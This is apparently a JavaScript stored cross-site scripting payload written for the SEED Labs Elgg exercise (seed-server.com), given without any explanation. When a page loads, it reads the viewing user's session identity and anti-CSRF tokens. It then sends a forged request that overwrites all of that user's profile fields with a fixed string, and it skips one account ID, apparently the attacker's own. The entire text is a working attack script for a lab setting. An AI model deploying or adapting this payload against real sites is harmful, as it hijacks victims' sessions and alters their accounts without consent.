<script type="text/javascript">
   window.onload = function() {
  
    var guid = elgg.session.user.guid;
    var name = elgg.session.user.name;
    var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
    var token = '&__elgg_token='+elgg.security.token.__elgg_token;


   
    var placeholder_string = '1905064';


    var sendurl = 'http://www.seed-server.com/action/profile/edit';


    var content = token+ts+'&name='+name;
    content += '&description=%3Cp%3E'+placeholder_string+'%3C%2Fp%3E&accesslevel%5Bdescription%5D=1';
    content += '&briefdescription='+placeholder_string+'&accesslevel%5Bbriefdescription%5D=1';
    content += '&location='+placeholder_string+'&accesslevel%5Blocation%5D=1';
    content += '&interests='+placeholder_string+'&accesslevel%5Binterests%5D=1';
    content += '&skills='+placeholder_string+'&accesslevel%5Bskills%5D=1';
    content += '&contactemail='+placeholder_string+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
    content += '&phone='+placeholder_string+'&accesslevel%5Bphone%5D=1';
    content += '&mobile='+placeholder_string+'&accesslevel%5Bmobile%5D=1';
    content += '&website=http%3A%2F%2Fwww.'+placeholder_string+'.com&accesslevel%5Bwebsite%5D=1';
    content += '&twitter='+placeholder_string+'&accesslevel%5Btwitter%5D=1';
    content += '&guid='+guid;
   


   
    if(guid != 59) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open('POST', sendurl, true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
   }
</script>
